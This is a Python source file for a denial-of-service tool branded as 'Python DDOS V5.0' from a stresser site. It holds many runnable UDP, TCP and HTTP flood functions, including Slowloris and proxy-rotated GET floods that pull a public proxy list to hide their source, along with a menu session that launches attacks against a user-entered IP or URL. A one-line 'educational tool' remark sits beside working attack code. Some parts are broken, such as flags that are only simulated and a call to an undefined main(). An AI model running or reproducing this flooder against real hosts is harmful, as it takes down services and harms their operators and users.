import socket
import random
import time
import threading
import requests
from colorama import init, Fore

# Initialize Colorama
init(autoreset=True)

# Set window title
print(f"\033]0;Python DDOS V5.0 By elitestresser.club\007", end="", flush=True)

# ASCII Art
ASCII_ART = """
·▄▄▄▄  ·▄▄▄▄        .▄▄ · 
██▪ ██ ██▪ ██ ▪     ▐█ ▀. 
▐█· ▐█▌▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄
██. ██ ██. ██ ▐█▌.▐▌▐█▄▪▐█
▀▀▀▀▀• ▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ 
       Python DDOS V5.0 - Made by elitestresser.club
"""

# Download proxies
def fetch_proxies():
    url = "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/refs/heads/master/http.txt"
    try:
        response = requests.get(url, timeout=5)
        proxies = response.text.splitlines()
        return [p for p in proxies if ":" in p]  # Filter valid proxy format
    except Exception as e:
        print(Fore.RED + f"[❌] Failed to fetch proxies: {e}")
        return []

PROXIES = fetch_proxies()

# UDP Flood Methods
def udp_plain_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = b"A" * packet_size
    print(Fore.CYAN + f"[🚀] UDP Plain Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets.")

def udp_random_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] UDP Random Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            payload = random.randbytes(packet_size)
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets.")

def udp_burst_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] UDP Burst Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            for _ in range(10):
                payload = random.randbytes(packet_size)
                sock.sendto(payload, (ip, port))
                packet_count += 1
            time.sleep(0.1)
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets.")

def udp_spoof_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] UDP Spoof Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            payload = random.randbytes(packet_size)
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets (Spoof simulated).")

def udp_frag_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] UDP Frag Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            payload = random.randbytes(packet_size // 2)
            sock.sendto(payload, (ip, port))
            sock.sendto(payload, (ip, port))
            packet_count += 2
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets.")

def udp_pulse_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] UDP Pulse Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            payload = random.randbytes(packet_size)
            for _ in range(5):
                sock.sendto(payload, (ip, port))
                packet_count += 1
            time.sleep(random.uniform(0.05, 0.2))  # Random pulse delay
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets.")

def udp_echo_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = b"ECHO" + random.randbytes(packet_size - 4)
    print(Fore.CYAN + f"[🚀] UDP Echo Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets.")

def udp_multicast_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    multicast_ip = f"224.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    print(Fore.CYAN + f"[🚀] UDP Multicast Flood on {multicast_ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            payload = random.randbytes(packet_size)
            sock.sendto(payload, (multicast_ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets (Multicast simulated).")

# TCP Flood Methods
def tcp_syn_flood_single(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] TCP SYN Flood (Single) on {ip}:{port} | {duration}s...")
    try:
        while time.time() < end_time:
            sock.connect_ex((ip, port))
            packet_count += 1
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} SYN packets.")

def tcp_syn_flood_multi(ip, port, duration):
    end_time = time.time() + duration
    packet_count = [0]
    def syn_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        while time.time() < end_time:
            try:
                sock.connect_ex((ip, port))
                packet_count[0] += 1
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            except:
                pass
        sock.close()
    print(Fore.CYAN + f"[🚀] TCP SYN Flood (Multi) on {ip}:{port} | {duration}s...")
    threads = [threading.Thread(target=syn_worker) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print(Fore.GREEN + f"[✅] Done! Sent {packet_count[0]} SYN packets.")

def tcp_data_flood_single(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = random.randbytes(packet_size)
    print(Fore.CYAN + f"[🚀] TCP Data Flood (Single) on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(payload)
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets.")

def tcp_data_flood_multi(ip, port, duration, packet_size):
    end_time = time.time() + duration
    packet_count = [0]
    def data_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        payload = random.randbytes(packet_size)
        try:
            sock.connect((ip, port))
            while time.time() < end_time:
                sock.send(payload)
                packet_count[0] += 1
        except:
            pass
        sock.close()
    print(Fore.CYAN + f"[🚀] TCP Data Flood (Multi) on {ip}:{port} | {packet_size} bytes | {duration}s...")
    threads = [threading.Thread(target=data_worker) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print(Fore.GREEN + f"[✅] Done! Sent {packet_count[0]} packets.")

def tcp_ack_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] TCP ACK Flood on {ip}:{port} | {duration}s...")
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(b"\x00" * 10)
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} ACK packets.")

def tcp_rst_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] TCP RST Flood on {ip}:{port} | {duration}s...")
    try:
        while time.time() < end_time:
            sock.connect_ex((ip, port))
            sock.close()
            packet_count += 1
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} RST packets.")

def tcp_xmas_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] TCP XMAS Flood on {ip}:{port} | {duration}s...")
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(b"\xFF" * 10)
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} XMAS packets.")

def tcp_fin_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] TCP FIN Flood on {ip}:{port} | {duration}s...")
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(b"\x01" * 10)  # Simulate FIN flag
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} FIN packets.")

def tcp_psh_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] TCP PSH Flood on {ip}:{port} | {duration}s...")
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(b"\x08" * 10)  # Simulate PSH flag
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} PSH packets.")

def tcp_window_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] TCP Window Flood on {ip}:{port} | {duration}s...")
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(b"\x00" * random.randint(1, 100))  # Random window size
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} Window packets.")

# HTTP/HTTPS Flood Methods
def http_get_flood(url, duration):
    end_time = time.time() + duration
    request_count = 0
    print(Fore.CYAN + f"[🚀] HTTP GET Flood on {url} | {duration}s...")
    try:
        while time.time() < end_time:
            requests.get(url, timeout=1)
            request_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    print(Fore.GREEN + f"[✅] Done! Sent {request_count} GET requests.")

def http_post_flood(url, duration):
    end_time = time.time() + duration
    request_count = 0
    print(Fore.CYAN + f"[🚀] HTTP POST Flood on {url} | {duration}s...")
    try:
        while time.time() < end_time:
            requests.post(url, data={"flood": "data" * 100}, timeout=1)
            request_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    print(Fore.GREEN + f"[✅] Done! Sent {request_count} POST requests.") ##made by elitestresser.club

def https_slowloris(url, duration):
    end_time = time.time() + duration
    connection_count = 0
    sockets = []
    print(Fore.CYAN + f"[🚀] HTTPS Slowloris on {url} | {duration}s...")
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((url.split("/")[2], 443))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + url.split("/")[2].encode() + b"\r\n")
            sockets.append(sock)
            connection_count += 1
            time.sleep(0.1)
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        for sock in sockets:
            sock.close()
        print(Fore.GREEN + f"[✅] Done! Opened {connection_count} connections.")

def http_head_flood(url, duration):
    end_time = time.time() + duration
    request_count = 0
    print(Fore.CYAN + f"[🚀] HTTP HEAD Flood on {url} | {duration}s...")
    try:
        while time.time() < end_time:
            requests.head(url, timeout=1)
            request_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    print(Fore.GREEN + f"[✅] Done! Sent {request_count} HEAD requests.")

def http_random_ua_flood(url, duration):
    end_time = time.time() + duration
    request_count = 0
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Gecko/20100101", ##elitestresser.club
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36",
    ]
    print(Fore.CYAN + f"[🚀] HTTP Random UA Flood on {url} | {duration}s...")
    try:
        while time.time() < end_time:
            proxy = random.choice(PROXIES) if PROXIES else None
            proxies = {"http": f"http://{proxy}"} if proxy else None
            headers = {"User-Agent": random.choice(user_agents)}
            requests.get(url, headers=headers, proxies=proxies, timeout=1)
            request_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    print(Fore.GREEN + f"[✅] Done! Sent {request_count} requests with random UAs.")

def http_proxy_flood(url, duration):
    end_time = time.time() + duration
    request_count = 0
    print(Fore.CYAN + f"[🚀] HTTP Proxy Flood on {url} | {duration}s (Proxies: {len(PROXIES)})...")
    try:
        while time.time() < end_time:
            proxy = random.choice(PROXIES) if PROXIES else None
            proxies = {"http": f"http://{proxy}"} if proxy else None
            requests.get(url, proxies=proxies, timeout=1)
            request_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    print(Fore.GREEN + f"[✅] Done! Sent {request_count} proxied requests.")

# ... (Existing imports and functions remain the same up to line 438)

# Validation functionality (Helper)
def validate_val(val, min_val, max_val, input_type=int):
    try:
        value = input_type(val)
        if min_val <= value <= max_val:
            return value, True
        return None, False
    except ValueError:
        return None, False

# --- Teybr OS Integration ---

class Ptm4Session:
    def __init__(self, shell):
        self.shell = shell
        self.state = "PROTOCOL_SELECT"
        self.params = {}
        self.output_buffer = []
        
        # Initial Welcome
        self.buffer_print(ASCII_ART, "yellow")
        self.show_main_menu()
        
    def buffer_print(self, text, color="white"):
        import re
        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        
        # Clean existing colors if any are embedded strings
        clean_text = ansi_escape.sub('', text).strip()
        if clean_text:
            self.output_buffer.append({"text": clean_text, "color": color})

    def show_main_menu(self):
        self.buffer_print("🔹 Protocols 🔹", "cyan")
        self.buffer_print("  1. UDP 🌊", "white")
        self.buffer_print("  2. TCP ⚡", "white")
        self.buffer_print("  3. HTTP/HTTPS 🌐", "white")
        self.buffer_print("Select protocol (1-3) or 'exit':", "yellow")
        self.state = "PROTOCOL_SELECT"

    def handle_input(self, cmd):
        # Flush previous buffer
        response = []
        cmd = cmd.strip()
        
        if cmd.lower() == "exit":
            self.shell.active_session = None
            return [{"text": "Exiting PTM4...", "color": "yellow"}]

        # State Machine
        if self.state == "PROTOCOL_SELECT":
            if cmd == "1":
                self.params["protocol"] = "UDP"
                self.buffer_print("🔹 UDP Methods 🔹", "cyan")
                self.buffer_print("  1. Plain  2. Random  3. Burst  4. Spoof  5. Frag", "white")
                self.buffer_print("  6. Pulse  7. Echo  8. Multicast", "white")
                self.buffer_print("Select method (1-8):", "yellow")
                self.state = "METHOD_SELECT"
            elif cmd == "2":
                self.params["protocol"] = "TCP"
                self.buffer_print("🔹 TCP Methods 🔹", "cyan")
                self.buffer_print("  1. SYN Single  2. SYN Multi  3. Data Single  4. Data Multi", "white")
                self.buffer_print("  5. ACK  6. RST  7. XMAS  8. FIN  9. PSH  10. Window", "white")
                self.buffer_print("Select method (1-10):", "yellow")
                self.state = "METHOD_SELECT"
            elif cmd == "3":
                self.params["protocol"] = "HTTP"
                self.buffer_print("🔹 HTTP/HTTPS Methods 🔹", "cyan")
                self.buffer_print("  1. GET  2. POST  3. Slowloris  4. HEAD  5. Random UA  6. Proxy", "white")
                self.buffer_print("Select method (1-6):", "yellow")
                self.state = "METHOD_SELECT"
            else:
                self.buffer_print("[❌] Invalid selection! Choose 1-3.", "red")

        elif self.state == "METHOD_SELECT":
            proto = self.params.get("protocol")
            valid = False
            if proto == "UDP" and cmd in [str(i) for i in range(1, 9)]: valid = True
            elif proto == "TCP" and cmd in [str(i) for i in range(1, 11)]: valid = True
            elif proto == "HTTP" and cmd in [str(i) for i in range(1, 7)]: valid = True
            
            if valid:
                self.params["method"] = cmd
                if proto in ["UDP", "TCP"]:
                    self.buffer_print("Enter server IP:", "yellow")
                    self.state = "IP_INPUT"
                else:
                    self.buffer_print("Enter URL (e.g., http://example.com):", "yellow")
                    self.state = "URL_INPUT"
            else:
                self.buffer_print("[❌] Invalid method number!", "red")

        elif self.state == "IP_INPUT":
            if cmd: # Allow loose IP validation for now
                self.params["ip"] = cmd
                self.buffer_print("Enter port (1-65535):", "yellow")
                self.state = "PORT_INPUT"
            else:
                self.buffer_print("[❌] IP cannot be empty.", "red")

        elif self.state == "URL_INPUT":
            if cmd:
                self.params["url"] = cmd
                self.buffer_print("Enter duration (seconds):", "yellow")
                self.state = "DURATION_INPUT"
            else:
                self.buffer_print("[❌] URL cannot be empty.", "red")

        elif self.state == "PORT_INPUT":
            val, ok = validate_val(cmd, 1, 65535)
            if ok:
                self.params["port"] = val
                self.buffer_print("Enter duration (seconds):", "yellow")
                self.state = "DURATION_INPUT"
            else:
                self.buffer_print("[❌] Invalid port! Enter 1-65535.", "red")

        elif self.state == "DURATION_INPUT":
            val, ok = validate_val(cmd, 1, float('inf'), float)
            if ok:
                self.params["duration"] = val
                # Determine next step based on protocol/method
                proto = self.params["protocol"]
                method = self.params["method"]
                
                needs_packet_size = False
                if proto == "UDP":
                    needs_packet_size = True
                elif proto == "TCP" and method in ["3", "4"]: # Data flood methods
                    needs_packet_size = True
                
                if needs_packet_size:
                    self.buffer_print("Enter packet size (1-65500):", "yellow")
                    self.state = "PACKET_SIZE_INPUT"
                else:
                    # Ready to launch
                    self.launch_attack()
            else:
                self.buffer_print("[❌] Invalid duration!", "red")

        elif self.state == "PACKET_SIZE_INPUT":
            val, ok = validate_val(cmd, 1, 65500)
            if ok:
                self.params["packet_size"] = val
                self.launch_attack()
            else:
                self.buffer_print("[❌] Invalid packet size!", "red")

        # Extract buffer content to return
        output = list(self.output_buffer)
        self.output_buffer = []
        return output

    def launch_attack(self):
        p = self.params
        proto = p["protocol"]
        method = p["method"]
        duration = p["duration"]
        
        self.buffer_print(f"🚀 Launching {proto} Attack...", "green")
        
        # Execute in a separate thread so we don't block the UI?
        # Ideally yes, but for now we might run it blocking or threaded.
        # Given the existing code uses threads internally for some floods, 
        # we can just call the function. However, the main loop usually waits.
        # We will dispatch a thread to run the attack logic to keep UI responsive.
        
        attack_thread = threading.Thread(target=self._run_attack_logic)
        attack_thread.start()
        
        self.buffer_print("Attack started in background.", "cyan")
        self.buffer_print("Type 'exit' to quit or wait for completion.", "grey")
        self.buffer_print("Dev Note: This is an educational tool.", "grey")
        
        # Reset to Menu? Or stay? Let's reset to menu to allow another attack.
        self.show_main_menu()

    def _run_attack_logic(self):
        # Recover params
        p = self.params
        proto = p["protocol"]
        method = p["method"]
        duration = p["duration"]
        
        try:
            if proto == "UDP":
                ip, port, pkt = p["ip"], p["port"], p["packet_size"]
                udp_methods = {
                    "1": udp_plain_flood, "2": udp_random_flood, "3": udp_burst_flood,
                    "4": udp_spoof_flood, "5": udp_frag_flood, "6": udp_pulse_flood,
                    "7": udp_echo_flood, "8": udp_multicast_flood
                }
                if method in udp_methods:
                    udp_methods[method](ip, port, duration, pkt)
            
            elif proto == "TCP":
                ip, port = p["ip"], p["port"]
                pkt = p.get("packet_size")
                
                if method == "1": tcp_syn_flood_single(ip, port, duration)
                elif method == "2": tcp_syn_flood_multi(ip, port, duration)
                elif method == "3": tcp_data_flood_single(ip, port, duration, pkt)
                elif method == "4": tcp_data_flood_multi(ip, port, duration, pkt)
                elif method == "5": tcp_ack_flood(ip, port, duration)
                elif method == "6": tcp_rst_flood(ip, port, duration)
                elif method == "7": tcp_xmas_flood(ip, port, duration)
                elif method == "8": tcp_fin_flood(ip, port, duration)
                elif method == "9": tcp_psh_flood(ip, port, duration)
                elif method == "10": tcp_window_flood(ip, port, duration)
            
            elif proto == "HTTP":
                url = p["url"]
                if method == "1": http_get_flood(url, duration)
                elif method == "2": http_post_flood(url, duration)
                elif method == "3": https_slowloris(url, duration)
                elif method == "4": http_head_flood(url, duration)
                elif method == "5": http_random_ua_flood(url, duration)
                elif method == "6": http_proxy_flood(url, duration)
                
        except Exception as e:
            # We can't print easily to the specific session as it might be gone, 
            # but we can try if we had a callback ref. For now just silent/console log.
            print(f"Attack Error: {e}")

def register(shell):
    def start_ptm4(args):
        try:
            session = Ptm4Session(shell)
            shell.active_session = session
            return session.output_buffer
        except Exception as e:
            return [{"text": f"Failed to start PTM4: {e}", "color": "red"}]

    shell.register_command("ptm4", start_ptm4)
    shell.register_command("ddos", start_ptm4)

if __name__ == "__main__":
    # Fallback for direct execution
    main()
